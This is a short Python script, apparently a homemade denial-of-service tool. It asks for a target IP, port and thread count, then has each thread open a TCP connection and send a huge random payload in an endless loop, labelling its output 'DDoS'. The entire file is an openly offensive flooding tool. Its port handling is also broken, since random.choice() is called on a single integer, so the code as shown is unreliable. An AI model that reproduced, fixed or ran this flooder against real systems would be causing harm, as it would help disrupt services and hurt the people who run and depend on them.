import socket
import random
import threading

target_ip = str(input("Target IP = "))
target_port = int(input("Target Port = "))
max_workers = int(input("Max Workers = "))

def ddos():
    try:
        target_ports = random.choice(target_port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_ports))
        print("[?] DDoS Created for: ( IP:", target_ip, "|", "Port:", target_ports, ")")
        payload = random._urandom(random.randint(32768, 65536)) * random.randint(500, 1000)
        while True:
            sock.sendto(payload, (target_ip, target_ports))
            print("[*] DDoS Successful for: ( IP:", target_ip, "Port:", "|", target_ports, ")")
    except KeyboardInterrupt:
        print("[!] DDoS Exit")
    except Exception as e:
        print("[!] DDoS an error occurred:", str(e))

for i in range(max_workers):
    thread = threading.Thread(target=ddos)
    thread.start()